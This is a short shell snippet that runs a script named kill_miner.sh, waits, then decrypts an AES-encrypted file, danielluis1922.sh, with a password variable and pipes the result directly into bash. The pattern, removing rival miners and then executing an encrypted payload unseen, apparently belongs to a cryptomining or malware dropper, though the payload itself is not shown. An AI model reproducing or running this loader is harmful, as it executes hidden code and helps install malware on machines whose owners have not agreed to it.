./kill_miner.sh
sleep 3
openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
